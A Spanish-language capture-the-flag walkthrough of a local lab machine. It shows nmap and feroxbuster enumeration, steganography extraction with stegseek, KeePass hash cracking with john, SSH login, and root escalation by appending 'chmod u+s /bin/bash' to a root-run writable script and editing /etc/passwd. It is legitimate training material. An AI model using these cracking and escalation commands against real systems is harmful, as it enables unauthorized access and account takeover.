# Enumeracion de PUertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 3000 172.17.0.2 -oN nmap
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 22:36 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fa:13:95:24:c7:08:e8:36:51:6d:ab:b2:e5:3e:3b:da (ECDSA)
|_  256 e2:f3:81:1f:7d:d0:ea:ed:e0:c6:38:11:ed:95:3a:38 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
```

comienzo chequeando el servicio web


![image](https://github.com/user-attachments/assets/116b6adb-c068-4aea-aaa0-63a38256c7fb)

me consigo con la plantilla de apache por lo que fuzzeare la web

```ruby
feroxbuster -u 'http://172.17.0.2' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 5
```
```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git, sh]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       22l      105w     5952c http://172.17.0.2/icons/ubuntu-logo.png
200      GET      363l      961w    10671c http://172.17.0.2/
200      GET      363l      961w    10671c http://172.17.0.2/index.html
200      GET      828l     4687w   413979c http://172.17.0.2/penguin.jpg
200      GET       13l       31w      342c http://172.17.0.2/penguin.html
[#####>--------------] - 78s   684343/2491620 3m      found:5       errors:616    
[#####>--------------] - 78s   686448/2491548 8851/s  http://172.17.0.2/  
```

solo observo una imagen asi que me la descargo

```ruby
wget http://172.17.0.2/penguin.jpg
```

ahora cheque si esta ocultando algun archivo por esteganografia

```ruby
steghide --info penguin.jpg
```

![image](https://github.com/user-attachments/assets/433ce75a-d8c6-4d73-a3b9-ebca8556b036)

solicita una password para extraer asi que le paso `stegseek`

```ruby
stegseek penguin.jpg --wordlist /usr/share/wordlists/rockyou.txt
```

![image](https://github.com/user-attachments/assets/7db048ba-2ad1-4a90-8481-984be840159b)

extrae un archivo llamado `penguin.jpg.out` que si lo examino

![image](https://github.com/user-attachments/assets/4b9d4163-81e8-4546-9e63-801d0e49a00d)

resulta ser un archivo `KDBX` por lo que le cambio la extension por la correcta y lo abro con `KeePass2`

```ruby
mv penguin.jpg.out penguin.kdbx
```

lo abro con `KeePass2`

![image](https://github.com/user-attachments/assets/d6f3f6ec-20e9-494d-9e6b-b1574d2c4c50)

solicita password por lo que intentare crackearla

extraigo y guardo el hash 
```ruby
keepass2john penguin.kdbx > hashkeepass
```
se lo paso a `john`

```ruby
john --wordlist=/usr/share/wordlists/rockyou.txt hashkeepass
```
```bash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (penguin)     
1g 0:00:00:00 DONE (2024-11-24 22:53) 7.142g/s 228.5p/s 228.5c/s 228.5C/s 123456..anthony
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

obtengo la password asi que procedo abrir el archivo en `KeePass2`

![image](https://github.com/user-attachments/assets/56a91ec6-0f69-43f6-be62-5f0d3f7b335d)

extraemos las credenciales para probarlas por `ssh`

![image](https://github.com/user-attachments/assets/f140db99-66b3-4ef0-8e2b-a7d29cdbafaa)

logramos el acceso

# Escalada de Privilegios

### penguin

En el directorio del user actual se encuentran 2 archivos, un script y un archivo de texto, tras chequear el escript, su tarea es escribir el `archivo.txt` = `pinguino no hackeable`,
si reviso los permisos del script, todos los grupos y usuarios tiene todos los permisos sobre el, es decir, cualquiera puede modificarlo y por otro lado si reviso los procesos,
el script esta siendo ejecutado por `root` por lo que para escalar solo debo agregarle una linea mas de codigo al script:

```bash
echo 'chmod u+s /bin/bash' >> script.sh
```

![image](https://github.com/user-attachments/assets/a2c33e45-c113-4753-84b2-4ec988b59f42)


por ultimo modifico el archivo `/etc/passwor` para eliminar la `x` que contiene la linea de `root` para escalar adecuadamente

![image](https://github.com/user-attachments/assets/c2a1feba-4706-4976-805c-ffeae556b7b3)

### `ROOT`










